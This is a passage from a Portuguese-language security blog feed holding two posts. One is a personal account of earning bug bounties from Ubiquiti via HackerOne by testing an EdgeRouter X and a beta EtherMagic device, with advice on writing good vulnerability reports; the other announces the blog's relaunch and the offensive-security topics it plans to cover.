&lt;p&gt;Como eu estava na vibe de estudar segurança em embarcados (aka IoT), eu consegui achar um vendor que encaixou como uma luva nos meus requisitos, a &lt;a href=&quot;https://hackerone.com/ubnt&quot;&gt;Ubiquiti Networks&lt;/a&gt;. Eles possuem regras claras, escopo bem definido, pagam bem e analisar um firmware e achar falhas iria ser massa. Apesar de outros vendors pagarem bem, um diferencial da UBNT foi que eles pagam assim que a vulnerabilidade é confirmada, enquanto que outros vendos só pagam quando a falha é corrigida, o que é compreensível, porém pode levar mais de três meses e isso iria me matar de ansiedade.&lt;/p&gt;

&lt;h3 id=&quot;definindo-o-alvo&quot;&gt;Definindo o Alvo&lt;/h3&gt;

&lt;p&gt;O próximo passo foi identificar o alvo e, depois de alguma pesquisa e de conversar com alguns conhecidos, cheguei na conclusão de comprar um &lt;a href=&quot;https://produto.mercadolivre.com.br/MLB-811540935-ubiquiti-edgerouter-x-er-x-5-portas-rj45-_JM?source=gps&quot;&gt;EdgeRouter X no MercadoLivre&lt;/a&gt;, um roteador gerenciável e com algumas funcionalidades bem interessantes. A compra (com frete) me fez desembolsar em torno de R$ 300,00. Mas eu sei que seria para um bem maior, e se achasse um simples XSS, já ganharia em torno de U$ 150,00, que seria suficiente para recuperar o valor investido (além de um pequeno lucro).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/edgerouter-ml.png&quot; alt=&quot;EdgeRouter X no MercadoLivre&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fiz a compra na quinta-feira, dia 30 de maio, e o router foi entregue quase duas semanas depois, no dia 14 de junho, véspera do feriado de 15 de junho (Corpus Christi).&lt;/p&gt;

&lt;h3 id=&quot;testes-e-resultados&quot;&gt;Testes e Resultados&lt;/h3&gt;

&lt;p&gt;Vou deixar claro que a “pornografia” técnica ficará em uma outra publicação futura. Além de que o objetivo dessa publicação é só relatar minha experiência e servir de incentivo aos que desejam ingressar na mesma área.&lt;/p&gt;

&lt;p&gt;Bom. Continuando…&lt;/p&gt;

&lt;p&gt;No dia que o roteador chegou, eu trabalhei até um pouco tarde, por volta de 21h e, então, resolvi sentar na minha máquina de pesquisas/estudos e dar uma olhada rápida na interface Web do roteador, já procurando pela possibilidade de identificar o meu tão precioso XSS.&lt;/p&gt;

&lt;p&gt;Acontece que, analisando as mensagens HTTP, foi possível identificar &lt;strike&gt;na cagada&lt;/strike&gt; uma vulnerabilidade em que um usuário de perfil Read-Only (eg: operator) conseguiria executar comandos como &lt;em&gt;root&lt;/em&gt; no dispositivo. Isso foi um achado maior do que o esperado, principalmente por ter sido somente nos primeiros minutos analisando a aplicação web do roteador. Porém, sem muita esperança, acreditei que a falha não teria tanto valor, já que seria necessário uma conta somente-leitura para o êxito da exploração, o que me fez considerar essa vulnerabilidade como uma simples Escalação de Privilégio, ao invés de uma Execução Remota de Comandos (RCE).&lt;/p&gt;

&lt;h3 id=&quot;escrevendo-o-relatório&quot;&gt;Escrevendo o Relatório&lt;/h3&gt;

&lt;p&gt;Uma dica fundamental é: escreva o relatório da melhor forma e o mais completo que você conseguir, pois isso irá influenciar significativamente no tempo de resposta e pode principalmente influenciar na recompensa do seu achado.&lt;/p&gt;

&lt;p&gt;Um relatório tem que ter por objetivo principal descrever a falha, deixar claro o impacto dela e, principalmente, ajudar/facilitar a reprodução da mesma. Quando os analistas/consultores da empresa lerem o relatório, quanto mais rápido eles entenderem a falha e conseguirem reproduzir ela, mais rápido ela passará pela triagem e mais rápido você vai receber a tão esperada recompensa.&lt;/p&gt;

&lt;p&gt;É importante deixar bem claro tudo o que foi feito para reproduzir a vulnerabilidade. Se for o caso, restaure a aplicação (fresh install) e anote passo-a-passo do que foi preciso fazer até conseguir reproduzir a falha. No caso dos embarcados, é importante deixar claro a versão do hardware e a versão do firmware testada.&lt;/p&gt;

&lt;p&gt;Um exemplo foi uma falha que reportei, porém a mesma só seria possível na primeira vez que se autenticasse na interface web. Não percebi esse detalhe e tive que trocar algumas mensagens com o vendor até conseguir chegar a um denominador comum e identificar esse critério na reprodução da falha.&lt;/p&gt;

&lt;p&gt;Continuando …&lt;/p&gt;

&lt;p&gt;Na noite de quinta ainda, escrevi um relatório o mais detalhado possível, explicando cada um dos passos necessários para reproduzir a falha, e submeti no HackerOne (depois de revisar algumas dezenas de vezes).&lt;/p&gt;

&lt;p&gt;Fui deitar e confesso que tentei dormir rápido, mas a ansiedade não me deixou, me fazendo ir até de madrugada pensando no relatório e em outras possíveis falhas ou testes que poderia fazer.&lt;/p&gt;

&lt;h3 id=&quot;a-primeira-recompensa&quot;&gt;A Primeira Recompensa&lt;/h3&gt;

&lt;p&gt;Ao acordar de manhã &lt;strike&gt;não tão cedo&lt;/strike&gt;, fui checar meus e-mails no celular como de costume, e notei que já tinham dois e-mails na caixa de entrada referente ao HackerOne. De cara eu já pensei o pior: “Será que falta alguma coisa no processo?”, “Será que esqueci de reportar algo?”, “Será que é duplicado?” etc.&lt;/p&gt;

&lt;p&gt;O primeiro e-mail foi que o meu report passou pela triagem, o que significa que a vulnerabilidade que eu reportei foi confirmada.&lt;/p&gt;

&lt;p&gt;Já me dei por satisfeito, ficando contente com os possíveis U$ 250,00 que estariam por vir. Até que eu vi o seguinte e-mail, que simplesmente dizia que eu já havia sido pago. Isso mesmo! Em menos de 12 horas a vulnerabilidade que eu identifiquei foi confirmada e a recompensa foi paga. Além do mais, ao invés dos U$ 250,00 que eu esperava, eu fui &lt;strong&gt;recompensado em U$ 1.500,00&lt;/strong&gt;, que além de pagar o investimento no EdgeRouter que eu havia comprado, daria para comprar mais 15 modelos iguais.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-primeiro-report.png&quot; alt=&quot;Primeiro relatório de vulnerabilidade&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;money-money-e-um-convite-inusitado&quot;&gt;Money, money e um convite inusitado(?)&lt;/h3&gt;

&lt;p&gt;Ganhar U$ 1.500,00 em uma brincadeira que levou poucos minutos foi mais que o suficiente para eu viciar na coisa. Lembram-se que era véspera de feriado? Pois então. Fiquei o feriado e o final de semana praticamente inteiro fuçando o aparelho, e o resultado foi mais quatro vulnerabilidades reportadas. Porém, diferente do primeiro report, uma delas foi considerada duplicada e os demais três foram recompensados em dois de U$ 150,00 e um de U$ 500,00. Isso se deve provavelmente à necessidade de iteração com o usuário e pelo fato da vulnerabilidade ter sido identificada em uma &lt;em&gt;feature&lt;/em&gt; beta do firmware.&lt;/p&gt;

&lt;p&gt;Como eu peguei gosto pela coisa, mas não tinha muito tempo disponível fora dos finais de semana, decidi me acalmar um pouco e só olhar um pouco durante os finais de semana. Porém no dia 15 de junho eu recebi uma mensagem privada da Ubiquiti me convidando para testar um equipamento do Beta Store, o &lt;a href=&quot;https://store.ubnt.com/products/ethermagic&quot;&gt;EtherMagic&lt;/a&gt;, e caso eu aceitasse, eles me enviariam um kit &lt;strong&gt;gratuito&lt;/strong&gt;. Isso fez com que eu percebesse o reconhecimento da empresa frente às minhas pesquisas de vulnerabilidade dos equipamentos deles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/invite-beta-test.png&quot; alt=&quot;Convite recebido&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;não-deixa-o-samba-morrer&quot;&gt;Não deixa o samba morrer…&lt;/h3&gt;

&lt;p&gt;Enquanto o aparelho novo não chegava, eu acabei olhando mais um pouco no bom e velho EdgeRouter durante mais um final de semana e o resultado foi a descoberta de mais duas vulnerabilidades. Como eu fiquei um pouco frustado com a recompensa anterior, resolvi voltar para o último release não-beta do firmware e o resultado foi interessante. Das duas falhas que havia reportado, uma delas me rendeu U$ 1.000,00 e a outra me rendeu mais U$ 1.500,00.&lt;/p&gt;

&lt;p&gt;Vamos fazer as contas: U$ 1.500,00 do primeiro relatório, U$ 150,00 + U$ 150,00 + U$ 500,00 da segunda “remessa” de reports (queimei um report como duplicado), e depois mais U$ 2.500,00 em dois reports reportados no final de semana seguinte. Eu já havia, somente olhando no meu tempo livre, acumulado U$ 4.800,00. Como diz um amigo meu: “Já da pra pagar umas contas!”.&lt;/p&gt;

&lt;h3 id=&quot;finalmente-chegou-oops&quot;&gt;Finalmente chegou!! Oops…&lt;/h3&gt;

&lt;p&gt;Depois de duas semanas que o aparelho novo foi postado, ele finalmente chegou nas minhas mãos. No começo fiquei um pouco preocupado de já abrir ele e sair soldando pinagem para UART (falarei sobre isso em publicações futuras) e acabar estragando, afinal de contas, se estragasse eu não poderia simplesmente abrir uma loja virtual e comprar outro. Mas infelizmente como o aparelho é beta, o suporte dele é bem limitado (pode-se dizer até que é inexistente), inclusive não existe uma versão do firmware dele na página de download do vendor. Ou seja, eu deveria extrair o firmware diretamente do device (também falarei disso em uma publicação futura) para conseguir acesso nele e fazer análise das aplicações em execução.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ethermagic.png&quot; alt=&quot;EtherMagic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Já era tarde da noite e eu estava razoavelmente cansado de tentar acesso ao aparelho. Porém eu, com meu conhecimento em hardware tendendo a zero, comecei a brincar com os comandos do bootloader dele (o U-Boot) e, de uma forma quase que milagrosa, consegui cagar com a memória FLASH do aparelho. #gênio&lt;/p&gt;

&lt;p&gt;Quando ele parou de responder e depois de um reboot o led sequer ascendia eu já previ o pior. Só me vinha na memória uma piada que eu sempre falava quando o assunto era mexer com hardware: “eu não mexo muito com hardware, porque não gosto de mexer com coisas que não da pra fazer backup”. Enquanto meu coração quase parava de bater, meu socorro foi um analista de segurança da Ubiquiti que aceitou trocar o hardware dele com o meu para eu continuar com os testes e ele tentar de alguma forma resolver o problema do meu diretamente com os engenheiros.&lt;/p&gt;

&lt;h3 id=&quot;talk-is-cheap-show-me-the-money&quot;&gt;Talk is cheap. Show me the money!&lt;/h3&gt;

&lt;p&gt;Ao invés de tentar fazer uma análise botton-up (do firmware para a aplicação), eu tentei mudar o modus operandi para uma análise top-down. Ou seja, resolvi seguir pelo caminho mais simples e comecei a usar e analisar o aparelho sem ter o firmware em questão, somente com o que me era acessível. Ele implementava um protocolo específico que sequer era sob HTTP, portanto para a análise rolou um pouco de escovação de bits e muito wireshark/tcpdump.&lt;/p&gt;

&lt;p&gt;Infelizmente como esse aparelho faz parte do programa Beta, a Ubiquiti não me autorizou fornecer mais detalhes sobre as falhas encontradas. Mas em um só final de semana reportei três falhas críticas no aparelho, as quais me renderam U$ 5.000,00 CADA UMA.&lt;/p&gt;

&lt;p&gt;Após o pagamento dessa última remessa de recompensa infelizmente o programa de recompensa para o EtherMagic foi congelado e ele passou a ficar fora do escopo dos testes.&lt;/p&gt;

&lt;h3 id=&quot;balanço-geral&quot;&gt;Balanço Geral&lt;/h3&gt;

&lt;p&gt;Um resumo desse mês brincando com Bug Bounties foram 10 falhas reportadas, sendo uma delas duplicada e 9 falhas com rendimento total de U$ 19.800.00, o que é grana pra c@%$#$:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/h1-extrato.png&quot; alt=&quot;Extrato do HackerOne&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Também como resultado disso, eu fechei 2017 na quinta posição do ranking de agradecimento da Ubiquiti Networks:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-thanks.png&quot; alt=&quot;Ranking da Ubiquiti em 2017&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h3&gt;

&lt;p&gt;Apesar de não ter sido um artigo puramente técnico (isso é o que não vai faltar nesse espaço), espero que tenha valido a pena a leitura e que tenha estimulado mais a comunidade de InfoSec a se aventurar nesses programas de recompensa. Qualquer dúvida ou sugestão deixe seu comentário e, se possível curtam a publicação para que eu possa ter uma visibilidade maior de que tipo de conteúdo mais interessa meus leitores.&lt;/p&gt;

&lt;p&gt;Boa caçada!&lt;/p&gt;

&lt;p&gt;Maycon Vitali&lt;br /&gt;
Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="bug-bounty" /><category term="hackerone" /><category term="ubiquiti" /><summary type="html">Esta primeira publicação tem como objetivo principal estimular e incentivar a participação de profissionais de segurança, hackers e entusiastas nos tão famigerados programas de recompensa por falhas; os chamados Bug Bounty Programs. Aqui não terá nada muito técnico, mas isso já está no TODO-List para publicações futuras.</summary></entry><entry xml:lang="br"><title type="html">I’m back, bitches!!</title><link href="http://localhost:4000/hello-world/2018/01/18/im-back.html" rel="alternate" type="text/html" title="I'm back, bitches!!" /><published>2018-01-18T13:26:36-02:00</published><updated>2018-01-18T13:26:36-02:00</updated><id>http://localhost:4000/hello-world/2018/01/18/im-back</id><content type="html" xml:base="http://localhost:4000/hello-world/2018/01/18/im-back.html">&lt;p&gt;Fala rapaziada. Estou criando essa primeira publicação só pra dizer que estou retomando às atividades de publicação de material e, por isso, estou reformulando tanto meu site pessoal quanto o site oficial da &lt;a href=&quot;http://www.hacknroll.io&quot;&gt;Hack N’ Roll&lt;/a&gt;. Assim que o novo leiaute estiver definido (muito provável que seja semelhante a esse, porque mexer com HTML e CSS é um &amp;amp;%#), irei gradativamente repassar as publicações do &lt;a href=&quot;http://www.hacknroll.com&quot;&gt;site antigo&lt;/a&gt; para o novo.&lt;/p&gt;

&lt;p&gt;Nesse site pessoal pretendo disponibilizar alguns materiais, como:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Resultados de algumas pesquisas&lt;/li&gt;
  &lt;li&gt;Material de palestras&lt;/li&gt;
  &lt;li&gt;Metodologia e material de estudo&lt;/li&gt;
  &lt;li&gt;Alguma ferramenta interessante que eu desenvolver&lt;/li&gt;
  &lt;li&gt;Dicas e truques de InfoSec (OffSec, okay? haha)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como alguns que já me conhecem devem saber, esse site conterá material relacionado aos seguintes assuntos:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Técnicas de segurança ofensiva geral&lt;/li&gt;
  &lt;li&gt;Técnicas de exploração de corrupção de memória&lt;/li&gt;
  &lt;li&gt;Técnicas que visam bypassar os mecanismos de proteção existentes&lt;/li&gt;
  &lt;li&gt;Engenharia reversa de software&lt;/li&gt;
  &lt;li&gt;Engenharia reversa de hardware (mais precisamente embedded devices aka IoT)&lt;/li&gt;
  &lt;li&gt;Lock Picking&lt;/li&gt;
  &lt;li&gt;Web Application Hacking&lt;/li&gt;
  &lt;li&gt;Vulnerabilidades encontradas&lt;/li&gt;
  &lt;li&gt;Informações sobre projetos pessoais e relacionado à HnR&lt;/li&gt;
  &lt;li&gt;Bug Bounty (O bom e velho &lt;code class=&quot;highlighter-rouge&quot;&gt;Talk is cheap! Show me the money...&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como alguns devem estar se perguntando “Por que em português?!”, a minha resposta será simples: “Porque eu quero!”. :-)
Na verdade pretendo com o tempo tentar internacionalizar o site e refazer as postagens em ambos, inglês e português. Mas a principio meu objetivo e favorecer ao povo tupiniquim. Além do mais, diversas coisas que eu publicar nesse site já terá material saturado em inglês.&lt;/p&gt;

&lt;p&gt;Apesar de eu não achar necessário por hora, vale resaltar que todo e qualquer material, comentários, visões e publicações feitas nesse site são de inteira responsabilidade minha e não de meu empregador.&lt;/p&gt;

&lt;p&gt;Let’s hack!&lt;/p&gt;

&lt;p&gt;Maycon Vitali&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="hello" /><summary type="html">Fala rapaziada. Estou criando essa primeira publicação só pra dizer que estou retomando às atividades de publicação de material e, por isso, estou reformulando tanto meu site pessoal quanto o site oficial da Hack N’ Roll. Assim que o novo leiaute estiver definido (muito provável que seja semelhante a esse, porque mexer com HTML e CSS é um &amp;amp;%#), irei gradativamente repassar as publicações do site antigo para o novo.</summary></entry></feed>